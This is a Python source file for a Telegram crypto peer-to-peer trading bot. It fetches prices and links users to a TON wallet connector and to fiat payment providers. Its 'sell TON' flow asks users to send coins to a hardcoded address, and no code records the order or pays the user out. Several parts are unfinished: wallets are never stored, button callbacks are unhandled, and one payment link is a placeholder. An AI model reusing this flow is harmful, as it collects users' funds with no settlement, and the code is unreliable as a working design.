import os
import time
import logging
import requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Logging
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

# Bot token
BOT_TOKEN = os.environ["BOT_TOKEN"]

# Global data
user_wallets = {}
user_orders = {}
user_signatures = {}
user_preferences = {}
user_pending_sell = {}
user_pending_buy_ton = {}
SUPPORTED_CRYPTOS = ["usdt", "btc", "eth", "bnb", "sol", "ton", "ada", "xrp", "dot", "doge"]
SUPPORTED_FIATS = ["USD", "NGN", "EUR", "KES", "GHS", "ZAR", "GBP"]
TON_RECEIVE_ADDRESS = "UQCMbQomO3XD1FSt7pyfjqj2jBRzyg23myKDtCky_CedKpEH"
TON_CONNECT_LINK = "https://gigi-ton-connect.vercel.app/?returnUrl=https%3A%2F%2Ft.me%2FGigiP2Bot"

# Price fetching
def get_bybit_price(symbol):
    try:
        url = f"https://api.bybit.com/v5/market/tickers?category=spot&symbol={symbol.upper()}USDT"
        r = requests.get(url).json()
        return float(r["result"]["list"][0]["lastPrice"])
    except:
        return None

def get_bitget_price(symbol):
    try:
        url = f"https://api.bitget.com/api/spot/v1/market/ticker?symbol={symbol.upper()}USDT"
        r = requests.get(url).json()
        return float(r["data"]["close"])
    except:
        return None

def get_best_price(symbol):
    prices = [p for p in [get_bybit_price(symbol), get_bitget_price(symbol)] if p]
    if prices:
        return f"\U0001F4B0 *{symbol.upper()}*: ${min(prices):,.2f}"
    return f"\u274C Couldn't get {symbol.upper()} price"

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("\U0001F517 Connect Wallet", url=TON_CONNECT_LINK)],
        [InlineKeyboardButton("\U0001F4B5 Buy Crypto", callback_data="buy_crypto")],
        [InlineKeyboardButton("\U0001F4B8 Sell Crypto", callback_data="sell_crypto")]
    ]
    await update.message.reply_text(
        "\U0001F44B Welcome to *GigiP2Bot* — your Web3 assistant \U0001F916\U0001F4B8\n\n"
        "Say things like:\n"
        "• *Buy BTC fast*\n"
        "• *Sell TON now*\n"
        "• *Buy TON with fiat*\n"
        "• *Connect my wallet*\n\n"
        "\U0001F447 Start by connecting:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# Dynamic chat handler
async def chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.message.chat_id
    text = update.message.text.strip().lower()

    # Step 1: Trigger sell TON
    if text in ["sell ton", "cash out ton"]:
        user_wallet = user_wallets.get(uid)
        if not user_wallet or user_wallet.get("type") != "ton":
            await update.message.reply_text("\u26A0\uFE0F Please connect your TON wallet first to sell TON.")
            return
        user_pending_sell[uid] = True
        await update.message.reply_text("\U0001F4B0 How much TON would you like to sell?")
        return

    # Step 2: Handle TON amount sell
    if uid in user_pending_sell:
        try:
            amount_ton = float(text)
            amount_nano = int(amount_ton * 1e9)
            ton_link = f"ton://transfer/{TON_RECEIVE_ADDRESS}?amount={amount_nano}"
            keyboard = [[InlineKeyboardButton(f"\u2705 Authorize {amount_ton} TON", url=ton_link)]]
            prompt = (
                f"\U0001F4B8 Almost done! Please authorize sending <b>{amount_ton} TON</b> to our service wallet "
                f"to complete your cash-out. Tap the button below to confirm \U0001F4F2."
            )
            await update.message.reply_text(prompt, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
            del user_pending_sell[uid]
        except:
            await update.message.reply_text("\u274C Please enter a valid number like 1.5 or 3")
        return

    # Step 3: Buy TON with fiat
    if text in ["buy ton", "buy ton with fiat"]:
        user_pending_buy_ton[uid] = True
        await update.message.reply_text("\U0001F4B5 How much (in your local currency) would you like to spend to buy TON?")
        return

    if uid in user_pending_buy_ton:
        try:
            amount_fiat = float(text)
            keyboard = [
                [InlineKeyboardButton("\U0001F30D Pay with Paystack", url="https://paystack.com/pay/example")],
                [InlineKeyboardButton("\U0001F680 Pay with MoonPay", url="https://www.moonpay.com/buy")],
                [InlineKeyboardButton("\U0001F310 Pay with Transak", url="https://global.transak.com/")]
            ]
            await update.message.reply_text(
                f"\U0001F9FE You’re buying TON worth <b>{amount_fiat}</b> in your local currency.\n\nChoose a payment provider:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="HTML"
            )
            del user_pending_buy_ton[uid]
        except:
            await update.message.reply_text("\u274C Please enter a valid amount like 5000 or 200")
        return

    # Step 4: Wallet signing
    if "sign" in text:
        user_wallet = user_wallets.get(uid)
        if not user_wallet:
            await update.message.reply_text("\U0001F510 Connect a wallet first.")
            return
        wallet_type = user_wallet.get("type")
        if wallet_type == "evm":
            await update.message.reply_text("\U0001F7E3 Please sign the transaction in your MetaMask wallet.")
        elif wallet_type == "solana":
            await update.message.reply_text("\U0001F7E1 Please sign the transaction in your Phantom wallet.")
        elif wallet_type == "ton":
            await update.message.reply_text("\U0001F537 Please sign using TON Connect link provided.")
        else:
            await update.message.reply_text("\u274C Unknown wallet type.")
        return

    await update.message.reply_text("\U0001F916 Try 'Sell TON', 'Buy TON', 'Connect wallet', or 'Sign'")

# Main entry
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, chat_handler))
    logging.info("\U0001F680 GigiP2Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()

